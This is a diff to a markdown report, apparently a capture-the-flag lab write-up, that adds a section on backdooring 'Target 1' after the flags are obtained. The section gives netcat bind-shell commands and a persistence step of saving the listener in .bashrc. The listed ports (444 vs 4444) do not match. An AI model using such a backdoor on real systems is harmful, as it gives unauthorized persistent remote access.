@@ -4,6 +4,8 @@
 - Exposed Services
 - Critical Vulnerabilities
 - Exploitation
+  - Obtain Flags 1-4
+  - Establish a back door
 
 ### Network Topology
 ![Network Topology](/Images/Final_project_top.JPG)
@@ -94,6 +96,16 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - Search for flag4
         - find . -name flag4.txt
         - ![flag4](/Images/flag4.png)
+  - Backdooring the Target
+    - **Exploit Used**
+      - Backdoor installed: (Bind Shell) Netcat
+        - Set up a listener on Target 1 by:
+      - Gain root access to Target 1 and executing:
+        - nc -lvnp 444 - /bin/bash
+        - Save a .sh file of the command in .bashrc
+      - Connect it to Kali by: 
+        - nc 192.168.1.110 4444
+      - ![Backdoor](/Images/Backdoor.png)
 
 
 
